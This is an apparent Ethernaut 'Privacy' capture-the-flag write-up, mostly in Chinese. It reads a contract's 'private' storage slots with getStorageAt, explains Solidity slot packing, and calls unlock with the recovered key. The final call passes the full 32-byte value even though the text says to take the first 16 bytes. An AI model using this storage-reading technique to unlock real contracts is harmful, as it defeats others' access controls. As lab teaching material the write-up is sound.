## 0x01 Task

```javascript
pragma solidity ^0.4.18;

contract Privacy {

  bool public locked = true;
  uint256 public constant ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  function Privacy(bytes32[3] _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

## 0x02 Solution

先按照`Vault`题目的思路，把`private`的数据读出来：

```javascript
web3.eth.getStorageAt(contract.address, 0, function(x, y) {alert(y)});
// 0x000000000000000000000000000000000000000000000000000000fbbbff0a01
web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(y)});
// 0x6f396091d021e1f8bcaa20b7ddee0f5d9a29812cba18da57c4f8d14cfa9db557
web3.eth.getStorageAt(contract.address, 2, function(x, y) {alert(y)});
// 0x874250db8f2de50c3e45833b8b787acc995739a58c2fbee736b3e843f3f46bdb
web3.eth.getStorageAt(contract.address, 3, function(x, y) {alert(y)});
// 0x41c6d2d9a50bbea305fbbd3709be8b7a0159fd9656ad79c7e3c99c43bbc7577e
web3.eth.getStorageAt(contract.address, 4, function(x, y) {alert(y)});
// 0x0000000000000000000000000000000000000000000000000000000000000000
```

每一个存储位是32个字节，根据Solidity的优化规则，当变量所占空间小于32字节时，会与后面的变量共享空间（如果加上后面的变量也不超过32字节的话）

- `bool public locked = true` 占 1 字节 -> `01`
- `uint8 private flattening = 10` 占 1 字节 -> `0a`
- `uint8 private denomination = 255` 占 1 字节 -> `ff`
- `uint16 private awkwardness = uint16(now)` 占 2 字节 -> `fbbb`

对应第一个存储位`fbbbff0a01`

则解题需要的`data[2]`就应该在第四存储位`0x41c6d2d9a50bbea305fbbd3709be8b7a0159fd9656ad79c7e3c99c43bbc7577e`

注意有bytes16转换，取前16个字节即可

```javascript
await contract.unlock("0x41c6d2d9a50bbea305fbbd3709be8b7a0159fd9656ad79c7e3c99c43bbc7577e")
```

